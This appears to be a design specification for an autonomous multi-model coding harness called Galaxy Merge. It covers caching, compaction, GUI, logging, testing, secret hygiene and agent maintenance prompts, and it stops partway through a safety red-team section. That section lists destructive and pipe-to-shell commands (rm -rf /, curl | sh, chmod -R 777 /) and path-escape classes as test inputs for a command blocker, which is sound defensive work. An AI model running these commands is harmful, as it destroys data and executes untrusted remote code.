# Part X. Cache, Token Budgeting, and Compaction

## 36. Cache Is Not Compaction

Galaxy Merge must have both caching and compaction. Cache avoids repeated work. Compaction preserves mission state when context grows too large. Ordinary chat truncation is not compaction. A stale provider response is not memory. A summary is not automatically verified truth.

Cache types:

```text
file summary cache
provider response cache
skill match cache
web search cache
browser page evidence cache
GitHub scan cache
fusion intermediate cache
command result cache
prompt segment cache
```

Cache keys should include:

```text
workspace_id
file_hash
goal_hash
prompt_hash
provider_id
model_id
role
tool_version
skill_hash
config_hash
safety_policy_hash
location_policy_hash
browser_evidence_hash
web_source_hash
```

Caches must never store secrets.

## 37. Per-Model Context Tracking

Each model has its own context window. Galaxy Merge must track context per provider/model/role call, not globally. Required fields include model ID, provider ID, role, context window, estimated input tokens, estimated output tokens, safety margin, and compaction threshold.

Compaction should trigger before overflow, commonly around 70 to 85 percent of usable context. The exact threshold should be configurable per model and role.

## 38. Compaction Must Preserve Mission State

Compaction must preserve:

```text
active goal
current plan
WorkRoot
TaskScope
changed files
important file summaries
tool results
browser evidence
web evidence
council outputs
open risks
safety blocks
location registry
degraded provider state
verification status
completion criteria
```

Compaction may compress or drop stale chat turns, verbose logs, repeated file dumps, old provider outputs, redundant search results, browser noise, and low-value intermediate text.

Compaction events must include:

```text
compaction_started
compaction_completed
model_id
role
reason
context_before_tokens
context_after_tokens
summary_path
```

Suggested outputs:

```text
.gm/sessions/<session_id>/compacted.md
.gm/sessions/<session_id>/compaction.jsonl
```

## 39. Prompt Prefix Stability

For providers with prefix/context cache behavior, such as DeepSeek-style cache systems, repeated prompt prefixes should remain stable. Static system rules, tool schemas, safety summaries, role protocols, and output schemas should be deterministic and ordered. Dynamic state should come later. Volatile tool results, terminal output, browser logs, diffs, and latest errors should be near the tail.

Recommended structure:

```text
[STABLE PREFIX]
- Galaxy Merge core system rules
- Safety Governor summary
- native tool protocol
- role/council protocol
- output schemas
- stable role instructions
- stable provider-neutral rules

[DYNAMIC MIDDLE]
- current goal
- current phase
- relevant retrieved notes/memory/skills
- selected file summaries
- changed files
- open risks
- current plan

[VOLATILE TAIL]
- latest tool results
- latest browser logs
- latest shell output
- latest diff
- latest council outputs
- latest verification errors
- current question for this role
```

The stable prefix should be built by deterministic code, not ad hoc string concatenation.

## 40. Token Budget Manager

Every provider call is a cost event. Before execution, the harness should compute estimated input tokens, output tokens, context percent used, cacheable prefix size, non-cacheable tokens, expected cache hit/miss behavior, and reason for call necessity.

If the call exceeds budget:

1. retrieve narrower context;
2. summarize stale context;
3. compress tool/browser/web logs;
4. replace file dumps with hashes and summaries;
5. drop low-value repeated text;
6. split task if needed;
7. downgrade to cheaper model if policy allows;
8. block and report if correctness would be unsafe.

Token economy must be visible in logs and GUI.

---

# Part XI. Workspace Indexing and Skills

## 41. Workspace Indexing

Workspace intelligence begins with indexing. MVP index:

```text
file tree
file hashes
text summaries
changed files
git status
relevant files for current goal
```

Later index:

```text
tree-sitter AST
symbols
imports/exports
dependency graph
test mapping
embeddings
```

Ignore by default:

```text
.git/
.gm/cache/
node_modules/
venv/
.venv/
dist/
build/
target/
__pycache__/
.cache/
coverage/
large binary files
```

Incremental indexing:

```text
hash file
compare previous hash
re-index changed file only
invalidate dependent summaries
update metadata
```

Indexing should not block the GUI indefinitely. Huge repositories require streaming progress, cancellation, and ignored folders.

## 42. Skill Discovery

Galaxy Merge discovers reusable skills automatically. Skill paths:

```text
~/skills
~/.config/galaxy-merge/skills
<WorkRoot>/.gm/skills optional later
```

Supported formats:

```text
SKILL.md
README.md
skill.json
skill.yaml
plain markdown folder
```

Example metadata:

```json
{
  "name": "webapp-debugging",
  "summary": "Use browser console logs and network errors to debug frontend apps.",
  "triggers": ["browser", "console", "webapp", "frontend"],
  "path": "~/skills/webapp-debugging/SKILL.md",
  "version_hash": "abc123"
}
```

Skills must be matched automatically based on goal, files, project type, and tool needs. The user should not need to manually say "use the webapp debugging skill." Selected skills and reasons should be shown in the GUI and logged.

---

# Part XII. GUI Design

## 43. GUI as Control Room

The GUI is not decoration. It is the operational control room. It must show truth, not theater.

Recommended layout:

```text
Top Bar:
  Project | Session | Goal Status | Safety | Providers

Left Pane:
  File Tree | Notes | Memory | Skills

Center Pane:
  Task Stream | Plan | Diff | Output | Goal Input

Right Pane:
  Council | Tools | Browser | Logs | Safety | Locations
```

Required panels:

```text
Goal Panel
File Tree
Chat/Task Stream
Council Panel
Tool Calls Panel
Browser/Web Panel
Notes/Memory Panel
Safety Panel
Location Panel
Logs Panel
```

The GUI must clearly display running, blocked, degraded, failed_safe, and complete. It must never show complete while hidden blocking errors exist.

Avoid:

- purple-gradient hero nonsense;
- glowing fake cards;
- useless "live" dots;
- decorative pills;
- emoji-as-icons;
- vague labels;
- huge empty panels;
- placeholder theater;
- hidden errors;
- animations that obscure state;
- GUI state pretending to be backend truth.

## 44. GUI Data Model

The GUI should consume structured backend events and API responses. It should not scrape terminal logs for truth. Event types include log, token, tool_event, provider_event, council_event, fusion_event, file_event, browser_event, safety_event, compaction_event, and completion_event.

The GUI should show:

- active goal;
- current phase;
- WorkRoot;
- TaskScope;
- session ID;
- safety state;
- provider/model availability;
- degraded providers;
- council roles;
- tool calls;
- shell commands;
- file changes;
- diffs;
- browser console errors;
- browser network errors;
- screenshots;
- web sources;
- GitHub scan results;
- notes and memory used;
- selected skills;
- location classifications;
- blocked actions;
- compaction events;
- verification status;
- completion status;
- crash/recovery state.

## 45. GUI Edge Cases

The GUI must handle:

```text
large logs
slow provider calls
provider failure
browser automation failure
backend reconnect
many sessions
huge file tree
partial council degradation
same-file conflicts
hidden blocking errors
missing provider keys
missing browser driver
failed GitHub scan
failed DuckDuckGo/Wikipedia/curl fetch
compaction during long task
self-codebase read-only diagnostic mode
```

Failure must be visible. A model/provider failure is not a silent console warning. Browser automation failure is not a hidden stack trace. Safety blocks should appear in the safety panel and task stream.

---

# Part XIII. Browser Automation and Webapp Repair

## 46. Webapp Repair Flow

For webapps, Galaxy Merge must not rely on file inspection alone. The expected flow:

```text
run dev server safely
open isolated browser profile
read console
read network
capture screenshot
inspect DOM
patch code through file tools
reload browser
verify console clean
run tests/build
completion skeptic review
```

If a frontend runtime error remains, completion is not allowed. If a network resource fails and affects functionality, completion is not allowed. If build/test fails and the failure is relevant, completion is not allowed unless explicitly explained and accepted by reviewer/skeptic.

## 47. Browser Evidence

Browser evidence must be recorded and summarized. Raw logs may be stored under `.gm/browser/` if safe. Model prompts should receive summarized relevant evidence, not giant raw logs. Repeated console errors should be grouped. Identical stack traces should be collapsed. Network failures should be grouped by URL/status/type. Screenshots should be referenced by path and not committed to public repo if they may contain secrets.

---

# Part XIV. Event Logging

## 48. Structured JSONL Logs

Galaxy Merge should use JSONL for structured logs. Example:

```json
{
  "time": "2026-06-28T12:00:00+03:00",
  "session_id": "gmsess_123",
  "event": "tool_call",
  "tool": "file.patch",
  "status": "success",
  "target": "src/router.py",
  "security_decision": "allow",
  "duration_ms": 42
}
```

Required events:

```text
session_started
workroot_detected
goal_received
goal_parsed
skill_selected
note_loaded
memory_loaded
provider_called
provider_failed
council_started
council_completed
fusion_started
fusion_completed
tool_call_started
tool_call_completed
tool_call_blocked
file_changed
command_started
command_completed
command_blocked
browser_opened
browser_console_error
index_updated
compaction_started
compaction_completed
verification_started
verification_completed
completion_review_started
completion_accepted
completion_rejected
secret_scan_started
secret_scan_completed
session_completed
session_crashed
```

Logs must be redacted. They should be structured enough to reproduce what happened without dumping secrets or enormous raw output.

## 49. Event Bus Semantics

Events should be ordered per session. If multiple sessions run, each session has its own stream. Project-level aggregate logs may exist, but they must preserve session IDs. WebSocket clients should not cause memory growth if disconnected. Massive log streams require backpressure and truncation or pagination.

---

# Part XV. Verification and Completion

## 50. Goal Engine

The Goal Engine turns user requests into executable objectives. It tracks:

```text
user request
parsed goal
completion criteria
relevant files
required tools
required skills
risk level
verification plan
current phase
```

Goal phases:

```text
idle
understanding
planning
inspecting
executing
patching
testing
reviewing
compacting
blocked
failed_safe
complete
```

Galaxy Merge should not ask permission for safe project-local work. It should act autonomously inside WorkRoot and TaskScope. It should ask only when external user action is required, such as missing credentials or policy-prohibited deployment.

## 51. Verification Levels

Completion requires evidence. Verification levels include:

```text
file re-read
diff inspection
syntax check
lint/typecheck if available
tests if available
build if available
browser console/network verification
reviewer role
completion skeptic role
```

A task is complete only when:

```text
goal criteria satisfied
changed files verified
tests/checks pass or failures explained
browser evidence clean when relevant
reviewer accepts
skeptic finds no blocking issue
```

The harness must never claim completion because a model says "done."

## 52. Completion Skeptic

The skeptic role exists because models over-complete. It should ask:

- Did we actually touch the right files?
- Did tests run?
- Did browser console remain clean?
- Did any required provider role fail?
- Did we ignore a safety block?
- Did we leave unstaged/unrelated changes?
- Did a same-file conflict occur?
- Did compaction lose state?
- Did we use stale cache?
- Did we inspect the final diff?
- Did we verify runtime behavior, not only syntax?

If the skeptic finds a blocking issue, completion is rejected.

---

# Part XVI. Repository Structure and Code Quality

## 53. Suggested Source Tree

Recommended structure:

```text
galaxy-merge/
  README.md
  CONTRIBUTING.md
  LICENSE
  pyproject.toml
  requirements.txt
  .gitignore
  .env.example
  gm
  scripts/
    install_local.sh
    run_dev.sh
    doctor.sh
    secret_scan.py
  config/
    providers.example.json
    models.example.json
    fusion.example.json
    routing.example.json
    safety.example.json
  galaxy_merge/
    __init__.py
    __main__.py
    app/
      launcher.py
      server.py
      lifecycle.py
      browser.py
    core/
      session.py
      orchestrator.py
      goal.py
      planner.py
      events.py
      errors.py
      config.py
    fusion/
      router.py
      council.py
      roles.py
      synthesizer.py
      reviewer.py
      schemas.py
      scoring.py
    providers/
      base.py
      registry.py
      openai_compat.py
      anthropic.py
      google.py
      deepseek.py
      minimax.py
      streamlake.py
      stepfun.py
      kimi.py
      local_ollama.py
    tools/
      kernel.py
      schemas.py
      file_tools.py
      shell_tools.py
      git_tools.py
      web_tools.py
      browser_tools.py
      github_tools.py
      curl_tools.py
      wikipedia_tools.py
      duckduckgo_tools.py
      index_tools.py
      memory_tools.py
      skill_tools.py
      verification_tools.py
      secret_tools.py
    browser/
      manager.py
      profiles.py
      playwright_driver.py
      selenium_driver.py
      console_logs.py
      network_logs.py
      screenshots.py
      dom.py
    web/
      search.py
      fetch.py
      curl_fetch.py
      duckduckgo.py
      wikipedia.py
      sources.py
      cache.py
    github/
      scanner.py
      repo_metadata.py
      issues.py
      pull_requests.py
      code_search.py
    locations/
      classifier.py
      registry.py
      remotes.py
      deployment_policy.py
      path_resolver.py
    workspace/
      root.py
      scope.py
      tree.py
      indexer.py
      symbols.py
      dependencies.py
      summaries.py
      ignore.py
    memory/
      store.py
      project_memory.py
      session_memory.py
      compaction.py
      retrieval.py
    skills/
      discovery.py
      parser.py
      matcher.py
      registry.py
    safety/
      governor.py
      path_policy.py
      command_policy.py
      credential_policy.py
      self_protection.py
      sandbox.py
      audit.py
    cache/
      store.py
      keys.py
      provider_cache.py
      file_cache.py
      fusion_cache.py
    git/
      repo.py
      checkpoints.py
      diffs.py
    gui/
      static/
        index.html
        css/app.css
        js/app.js
        js/api.js
        js/state.js
        js/panels/goal.js
        js/panels/files.js
        js/panels/council.js
        js/panels/tools.js
        js/panels/logs.js
        js/panels/safety.js
        js/panels/memory.js
  tests/
    test_launcher.py
    test_workroot.py
    test_safety.py
    test_secret_scan.py
    test_provider_config.py
    test_fusion.py
    test_compaction.py
    test_sessions.py
    test_notes.py
    test_tools.py
    test_browser.py
```

## 54. Code Quality Doctrine

Hard rules:

- no normal source file above 1000 lines unless generated/vendor/justified;
- files above 700 lines should be reviewed for splitting;
- no module mixing launcher, server, GUI API, tool execution, provider calls, safety, and persistence;
- no broad dumping-ground `utils.py` unless small and cohesive;
- no silent `except Exception: pass`;
- no import-time network calls;
- no provider health checks at import time;
- no browser libraries imported in pure unit paths unless needed;
- no hidden global runtime state;
- no direct shell/file/git mutation outside tool kernel;
- no hardcoded private paths;
- no hardcoded secrets;
- no GUI truth separate from backend truth;
- no fake stubs presented as implementation.

The codebase should be modular because the harness itself will be maintained by agents. Agents make worse mistakes in giant tangled files. Smaller modules reduce blast radius and improve tests.

---

# Part XVII. Testing Doctrine

## 55. Test Organization

Tests must be fast, bounded, deterministic, and secret-safe.

Recommended structure:

```text
tests/unit/
tests/integration/
tests/e2e/
tests/fixtures/
```

Markers:

```text
unit
integration
e2e
slow
browser
network
provider
```

Default CI should run unit plus safe integration tests. Slow/browser/e2e tests should be opt-in or separate jobs. No normal tests should call real providers, real web search, real GitHub API, real browser profile, real home config, or real secrets.

## 56. Required Tests

Unit tests:

- WorkRoot detection;
- TaskScope detection;
- location classification;
- Safety Governor path policy;
- Safety Governor command policy;
- redaction;
- provider config loading;
- model config loading;
- routing/fusion config loading;
- missing provider key behavior;
- cache key generation;
- compaction trigger logic;
- `.gm` schema creation;
- notes CRUD storage logic;
- memory read/write;
- file hash conflict detection;
- atomic write helper;
- lock helper;
- event schema validation;
- tool registry/schema registration;
- blocked tool result format;
- self-codebase detection.

Integration tests:

- `gm` launcher creates session state;
- backend starts on localhost;
- port fallback works;
- WebSocket emits session events;
- GUI API returns structured data;
- native tool calls pass through Safety Governor;
- provider failure becomes degraded state;
- compaction preserves mission state;
- browser profile path is per-session;
- GitHub scan redacts token;
- `.gm` shared resources survive concurrent writes;
- same-file conflict blocks silent overwrite.

End-to-end smoke tests:

- run `gm` from generated normal project;
- verify `.gm` created;
- verify backend ready;
- verify GUI route reachable;
- verify event log written;
- verify safe file read;
- verify blocked dangerous command;
- verify graceful shutdown;
- verify no secrets in generated logs.

## 57. No-Hang Test Rules

No test may hang forever. Use timeouts. Replace sleeps with deterministic synchronization, events, queues, futures, health endpoints, or bounded polling. Use `asyncio.wait_for` or `anyio.fail_after`. Every subprocess, server, browser context, temp directory, lock, and async task must be cleaned up.

Hard rules:

- no real external provider calls in normal tests;
- no real web/GitHub calls in normal tests;
- no real browser automation in unit tests;
- no fixed long sleeps;
- no hardcoded port unless testing port conflict;
- no real `~/.config`, `~/.cache`, `~/.local`, `~/skills`, `.env`, SSH keys, OpenCode configs, or browser profiles;
- no test-order dependency.

---

# Part XVIII. Public Repository Hygiene

## 58. Public Repo Safety

Galaxy Merge is open source. The repository must be safe for public viewing. Never commit:

```text
API keys
bearer tokens
OAuth tokens
cookies
SSH keys
private provider config
.env files
.npmrc with token
.pypirc
cloud credentials
browser profiles
local OpenCode config dumps
.gm runtime state
private logs
screenshots containing secrets
FTP/SSH credentials
private deployment target credentials
```

Allowed:

```text
.env.example
providers.example.json
models.example.json
fusion.example.json
routing.example.json
fake test fixtures
schema examples with fake data
README/docs explaining env setup
redacted logs for examples only
```

Repository should contain:

```text
.gitignore
.env.example
config/providers.example.json
config/models.example.json
config/fusion.example.json
config/routing.example.json
CONTRIBUTING.md
scripts/secret_scan.py or equivalent
pre-commit instructions
CI secret scan if feasible
```

If a secret is found in git history, treat it as compromised. Deleting from the latest file is insufficient. Rotate the secret, clean history, and rerun scans.

## 59. Push Gate

Before pushing:

1. verify `git remote -v`;
2. inspect branch;
3. run tests;
4. run secret scan;
5. inspect `git status`;
6. inspect `git diff`;
7. ensure `.gm`, logs, browser profiles, screenshots with secrets, real provider configs, and local-only files are not staged;
8. ensure example configs use placeholders;
9. ensure docs do not claim unimplemented features as real;
10. commit coherent changes;
11. push only if safe.

---

# Part XIX. Runtime Scenarios

## 60. Normal Local Bug Fix

User runs `gm` in a repo and asks: "Fix the login redirect bug."

Expected behavior:

```text
detect WorkRoot
load notes and memory
index relevant files
spawn planner/scout/reviewer/implementer/synthesizer
inspect routes/auth code
apply minimal patch
run tests
inspect diff
completion skeptic review
final summary with changed files and evidence
```

No remote deploy. No random refactor. No unrelated files.

## 61. Webapp Debugging

User asks: "Fix this webapp. Use browser console."

Expected behavior:

```text
run dev server safely
open isolated browser profile
capture console and network logs
find runtime error
patch code
reload browser
verify console clean
run build/test
final evidence includes browser logs
```

The task is not complete if console remains broken.

## 62. Multiple Sessions Same WorkRoot

User launches two sessions in the same project.

Expected behavior:

```text
unique session ids
separate browser profiles
separate tool state
shared .gm notes/memory locked or append-safe
same-file conflicts detected
no silent overwrite
```

## 63. Provider Failure

One model returns 500 or times out.

Expected behavior:

```text
timeout enforced
provider failure logged
fallback selected if configured
role marked degraded if no fallback
GUI and terminal show failure
fusion continues only if quorum is safe
completion status reflects degradation
```

## 64. Long Session With Context Pressure

A large refactor produces too much context.

Expected behavior:

```text
model context usage tracked
compaction triggered before overflow
mission state preserved
stale logs compressed
provider call continues
GUI shows compaction event
```

## 65. Self-Codebase Launch

User runs `gm` inside Galaxy Merge source tree.

Expected behavior:

```text
detect own codebase
enter read-only diagnostic mode
no file patches
no mutating shell commands
no git mutation
allow diagnosis only
```

## 66. Public Release

Engineer prepares to push to GitHub.

Expected behavior:

```text
run secret scan
verify .gitignore
verify no .env
verify no real provider configs
verify no .gm runtime state
run tests
push only if safe
```

---

# Part XX. MVP Build Order

## 67. Milestones

Milestone 1: Skeleton

```text
repo structure
Python package
gm launcher
local server
browser open
simple GUI
WorkRoot detection
.gm creation
session directory
event log
```

Milestone 2: Tools and Safety

```text
file tools
shell tool
git status/diff
Safety Governor
path policy
command policy
secret redaction
self-protection
```

Milestone 3: Providers and Council

```text
provider registry
provider config
model config
role config
council execution
fusion synthesizer
provider failure handling
```

Milestone 4: Workspace Intelligence

```text
file tree
search
summaries
basic index
notes CRUD
memory
skill discovery
```

Milestone 5: Web and Browser

```text
DuckDuckGo
Wikipedia
curl/fetch
isolated browser
console logs
network logs
screenshots
GitHub scan
```

Milestone 6: Compaction and Verification

```text
context tracking
auto compaction
verification loop
completion skeptic
same-file conflicts
parallel sessions
```

Milestone 7: Public Release Safety

```text
secret scanning
.gitignore
example configs
README
CONTRIBUTING
CI checks
release gate
```

---

# Part XXI. Maintenance Prompts and Agent Doctrine

## 68. General Engineering Maintenance Prompt

Use this when assigning a broad maintenance pass:

```text
You are maintaining Galaxy Merge Harness on an Ubuntu/Linux machine. Inspect the local installation and the public GitHub repository. Compare implementation, installed launcher behavior, docs, tests, config examples, CI, and runtime behavior. Galaxy Merge is a self-contained gm-launched local coding harness with browser GUI, terminal-owned Python runtime, native tools, Safety Governor, .gm persistence, session isolation, provider/model routing, council fusion, cache, compaction, browser debugging, web research, GitHub scanning, verification, and public repo secret hygiene. It is not a chatbot, not an endpoint, not MCP-first, and not a wrapper around another harness. Treat implementation as untrusted until verified. Fix confirmed defects only. Keep changes small, modular, tested, and secret-safe. Run tests, smoke test gm from a normal project, run secret scan, inspect git diff, commit and push only if safe. Final report must include files changed, tests run, runtime evidence, GUI evidence, safety evidence, secret-scan result, commit hash, push status, risks, and next patch list.
```

## 69. Backend Runtime Prompt

Use this for backend and launch issues:

```text
Focus only on Python backend architecture, gm launch behavior, localhost server lifecycle, port selection, WebSocket/event streaming, session isolation, .gm concurrency safety, crash recovery, backend edge cases, cancellation, provider timeouts, compaction triggers, and runtime correctness. Verify multiple gm instances in the same WorkRoot, port conflicts, stale sessions, correct browser attachment, clean shutdown, no event-loop blocking, no unbounded waits, atomic writes, locks, session heartbeats, same-file conflicts, and redacted logs. Push only after tests and secret scan pass.
```

## 70. GUI Prompt

Use this for frontend work:

```text
Focus only on the browser GUI, frontend UX, GUI/backend event integration, visual clarity, and operational observability. The GUI is the control room. It must show active goal, WorkRoot, TaskScope, session, safety, providers, council, tools, file changes, browser logs, web sources, GitHub scans, locations, blocked actions, degraded providers, verification, compaction, and completion. Remove decorative AI-slop. Consume structured backend events. Handle huge logs, slow providers, failures, reconnect, many sessions, huge file tree, same-file conflicts, missing provider keys, browser automation errors, and self-codebase read-only mode. Do not expose secrets. Run gm and verify GUI connects to the correct session.
```

## 71. Test Optimization Prompt

Use this when tests are slow or hanging:

```text
Optimize Galaxy Merge tests for speed, determinism, and no-hang reliability. Unit tests must be fast and pure. No normal test may call real providers, web, GitHub, browser profiles, home config, .env, SSH keys, OpenCode configs, or secrets. Add pytest timeouts. Replace sleeps with events/futures/health checks/bounded polling. Use fake providers, fake browser manager, fake event bus, fake projects, fake .gm, and temp env. Mark slow/browser/network/provider tests. Prove improvement with pytest --durations.
```

## 72. Cache and Token Economy Prompt

Use this for token/cost work:

```text
Perform caching, token saving, prefix stability, and API cost optimization. Distinguish provider-side prefix cache, local response cache, file summary cache, index cache, skill cache, web/browser/GitHub cache, compaction, retrieval, summarization, and call avoidance. Keep stable prompt prefixes deterministic. Track context per model/role. Add token budget manager, prompt assembly reports, cache invalidation, deduplication, tool output compression, compaction preservation, token telemetry, GUI token economy panel, and tests. Never cache or send secrets.
```

## 73. Public Repo Quality Prompt

Use this for repository synchronization:

```text
Perform engineering quality, test, and repository synchronization hardening. Inspect local installation and public GitHub repo. Reconcile differences. Enforce code quality, module boundaries, line count limits, tests, CI, packaging, install reliability, dependency hygiene, docs drift, and release readiness. No giant files, fake stubs, duplicate implementations, hidden globals, hardcoded paths, hardcoded secrets, direct mutation outside tool kernel, or docs claiming unimplemented features. Run tests and secret scan before push.
```

---

# Part XXII. Known Failure Modes and Diagnostics

## 74. Dead GUI at Boot

Symptoms:

```text
GUI fields show --
Project: --
WorkRoot: --
TaskScope: --
Backend: --
Providers: --
Browser console shows JS SyntaxError
/api/session not called
WebSocket not connected
```

Likely cause: frontend JavaScript parse error or stale served asset. First step is not provider work. It is:

```bash
node --check galaxy_merge/gui/static/js/app.js
```

Then verify DevTools has no fatal JavaScript error, `/api/session` responds, `/api/project` responds, WebSocket connects, file tree loads, and goal input reaches backend.

## 75. Public Repo Mismatch

If local files are clean but public raw GitHub appears corrupted, perform a fresh clone:

```bash
cd /tmp
rm -rf GalaxyMerge-public-check
git clone https://github.com/yunusemrejr/GalaxyMerge.git GalaxyMerge-public-check
cd GalaxyMerge-public-check
git rev-parse HEAD
git log --oneline -5
wc -l galaxy_merge/gui/static/js/app.js pyproject.toml scripts/install_local.sh
node --check galaxy_merge/gui/static/js/app.js
```

If fresh clone matches local, external fetch may be stale. If fresh clone is corrupted, local changes were not pushed to public main or the wrong branch was used.

## 76. Provider Failure Masquerading as Completion

If a required reviewer/skeptic/synthesizer fails and the GUI still says complete, the completion gate is broken. Inspect provider events, council events, fusion result, completion review, and final summary. Required role failure should degrade or block completion unless policy explicitly allows fallback.

## 77. Same-File Silent Overwrite

If two sessions edit the same file and one patch silently overwrites the other, file conflict protection is broken. Check hash-before-edit, hash-before-write, locks, atomic writes, and conflict events.

## 78. Secret Leakage

If any real secret appears in tracked files, history, logs, GUI, screenshot, cache, memory, prompt, or test fixture, stop. Rotate the secret. Clean history if committed. Add regression tests and redaction rules.

---

# Part XXIII. Final Acceptance

## 79. Acceptance Criteria

Galaxy Merge is healthy only if:

```text
gm launches GUI from normal project
terminal owns runtime logs
browser GUI connects to correct session
.gm schema correct
project notes CRUD works
project notes persist
session notes, project notes, and memory are separate
multiple sessions isolated
shared .gm state safe
same-file conflicts detected
WorkRoot and TaskScope correct
location classification correct
remote/prod mutation blocked by default
native tools schema-registered
every mutation goes through tools
risky tools go through Safety Governor
shell sandbox works
dangerous commands blocked
bypass attacks blocked
secrets redacted everywhere
self-modding impossible
self-codebase launch enters read-only diagnostic mode
provider configs load without secrets
model configs valid
role assignment config-driven
provider failure degrades safely
fallback bounded and logged
council roles real and visible
fusion is synthesis, not best-answer selection
cache works without secrets
context compaction preserves mission state
workspace indexing works
skill discovery automatic
native web search works
DuckDuckGo works
Wikipedia works
curl/fetch works safely
web prompt injection contained
isolated browser automation works
browser console logs captured
browser network errors captured
GitHub repo scan works
GitHub tokens redacted
git strategy avoids unrelated changes
goal engine tracks phases and criteria
verification prevents premature completion
GUI shows operational truth
event logs structured and redacted
crash recovery minimally functional
public repo secret scan passes
README/CONTRIBUTING explain secret-safe setup
end-to-end webapp repair scenario passes
```

## 80. Final Definition

Galaxy Merge Harness is a self-contained Ubuntu/Linux-native autonomous coding harness credited to Yunus Emre Vurgun. It is launched with `gm`, controlled through a local browser GUI, backed by a Python runtime, structured around native internal tools, protected by a deterministic Safety Governor, enriched by OS skills and project notes, persistent through `.gm` project state, capable of isolated browser debugging and native web research, driven by a multi-model council whose outputs are fused into verified code changes, and safe for open-source public development when repository hygiene rules are followed.

It is not a chatbot.  
It is not an OpenAI-compatible endpoint.  
It is not a wrapper around another harness.  
It is not MCP-first.  
It is a full personal coding harness designed to make multiple LLMs behave like one disciplined local engineering system.

---

# Appendix A. Compact Engineering Principles

```text
Reality before assumption.
Smallest safe change.
Read broadly, write narrowly.
Autonomous inside WorkRoot.
Hard stop outside safe boundaries.
No self-modding.
No secrets in repo, logs, GUI, prompts, cache, or memory.
Fusion over winner selection.
Evidence over model confidence.
Every mutation through tools.
Every risky tool through Safety Governor.
Every important action logged.
Every session isolated.
Shared project state locked or append-safe.
Completion requires verification.
```

# Appendix B. Minimal Smoke Test

A minimal smoke test after install should verify:

```text
gm resolves
backend starts
browser opens
GUI connects
/api/session returns session
/api/project returns WorkRoot
WebSocket receives event
.gm/project.json exists
.gm/sessions/<session_id>/events.jsonl exists
file tree loads
safe file read works
dangerous command is blocked
terminal logs are redacted
Ctrl+C shuts down cleanly
```

# Appendix C. End-to-End Webapp Test

A generated broken webapp should include:

```text
one frontend runtime error
one missing import or route
one failing test/build error
one browser console error
existing git repo
project notes
relevant OS skill
fake remote/prod targets
```

Expected harness behavior:

```text
detect WorkRoot
create/load .gm
create session
load notes/memory/skills
index workspace
spawn council
inspect files
run dev server safely
open isolated browser
capture console/network
patch code
reload browser
verify console clean
run tests/build
inspect diff
reviewer pass
skeptic pass
final summary with evidence
```

# Appendix D. Public Release Checklist

```text
git remote verified
branch verified
tests pass
secret scan pass
no .env tracked
no real provider config tracked
no .gm runtime state tracked
no browser profiles tracked
no private logs tracked
no screenshots with secrets tracked
config examples placeholders only
README install works
CONTRIBUTING no-secrets policy exists
CI checks exist where feasible
commit coherent
push only if safe
```

---

End of document.


---

# Part XXIV. Detailed Backend Runtime Specification

## 81. Backend Source of Truth

The backend is the source of truth for state. The GUI renders backend state. Provider/model outputs are evidence candidates, not state authority. Filesystem writes are tool results, not model actions. The backend must therefore be structured around explicit state machines and schemas rather than loose dictionaries drifting through async callbacks.

Core backend objects should include:

```text
ProjectState
SessionState
GoalState
PhaseState
ToolCallRecord
ProviderCallRecord
CouncilRoleRecord
FusionRecord
SafetyDecision
LocationClassification
BrowserSessionRecord
WebSourceRecord
GitHubScanRecord
CompactionRecord
VerificationRecord
CompletionReviewRecord
ErrorRecord
EventRecord
```

Each object should be serializable. If it cannot be serialized, it cannot be safely logged, recovered, or rendered. Runtime-only handles such as subprocess objects, sockets, browser driver handles, and async tasks should be referenced by IDs and managed by lifecycle registries, not dumped into persistent JSON.

## 82. Backend Lifecycle

Backend lifecycle should be explicit:

```text
created
starting
ready
running_goal
stopping
stopped
crashed
recoverable
```

Startup must not be considered ready until the server is bound, session state exists, `.gm` is initialized, event bus is active, and the GUI route can query `/api/session`. Provider health checks may be async and should not block basic GUI readiness unless the task requires providers.

Shutdown should flush events, terminate child processes, close browser contexts, release locks, write final state, and mark session state stopped or crashed. Ctrl+C should not leave corrupted JSON files.

## 83. API Route Semantics

Suggested internal routes:

```text
GET  /api/session
GET  /api/project
GET  /api/tree
GET  /api/file?path=
POST /api/goal
POST /api/stop
POST /api/resume
GET  /api/events
GET  /api/logs
GET  /api/council
GET  /api/tools
GET  /api/safety
GET  /api/notes
POST /api/notes
PATCH /api/notes/<note_id>
DELETE /api/notes/<note_id>
POST /api/notes/<note_id>/restore
GET  /api/web/search
POST /api/web/fetch
POST /api/browser/open
GET  /api/browser/console
GET  /api/browser/network
GET  /api/locations
POST /api/github/scan
POST /api/secret-scan
```

These routes are internal GUI routes. They do not create an external harness API. They must enforce session ID and safety. A GUI call should not be able to write an arbitrary file by directly hitting a route that bypasses tool execution.

## 84. WebSocket Semantics

Suggested WebSocket path:

```text
/ws/session/<session_id>
```

The WebSocket should stream structured events. If the GUI disconnects, the backend should keep session state unless the user explicitly stops it or the terminal process exits. On reconnect, the GUI should fetch a snapshot and then subscribe to live events. Event replay should be bounded and paginated, not infinite in-memory retention.

Events should have at least:

```json
{
  "event_id": "gmevt_...",
  "time": "2026-06-28T12:00:00+03:00",
  "session_id": "gmsess_...",
  "project_id": "gmproj_...",
  "type": "tool_call_completed",
  "status": "success",
  "payload": {},
  "redaction_status": "redacted",
  "sequence": 123
}
```

The sequence number is useful for reconnect correctness.

## 85. Async and Cancellation

Provider calls, shell commands, browser automation, web fetches, GitHub scans, indexing, and compaction must not block the event loop. Use async clients, worker tasks, or subprocess management with bounded timeouts. Every long-running action needs cancellation semantics. Cancelling a goal should cancel provider calls if possible, stop or detach managed dev servers according to policy, close browser contexts, flush partial logs, and mark the goal as stopped or failed_safe, not leave it "running" forever.

---

# Part XXV. Detailed Safety Red-Team Matrix

## 86. Path Attacks

The Safety Governor must test these path attack classes:

```text
absolute system path
home directory write
hidden credential file
symlink inside WorkRoot pointing outside
../ traversal
double traversal with normalization tricks
quoted path with spaces
glob expansion escaping expected scope
environment variable expansion
command substitution producing path
relative path after cwd change
case variations on case-insensitive filesystems where applicable
unicode confusables where practical
hard link edge cases where practical
```

The policy should resolve real paths before mutation and compare canonical target paths against allowed roots. It should refuse ambiguous targets.

## 87. Command Attacks

Command classification must treat shells as hostile composition engines. A command is not safe merely because the first token looks harmless. Test:

```bash
echo ok && rm -rf /tmp/important
python -c "import os; os.remove('/etc/passwd')"
bash -c 'rm -rf /'
sh -c "$(cat script.sh)"
curl https://example.com/install.sh | sh
wget -O- https://example.com/install.sh | bash
sudo chmod -R 777 /
VAR=/etc; rm -rf "$VAR"
rm -rf "$(pwd)/../../"
find . -type f -delete
git push origin main
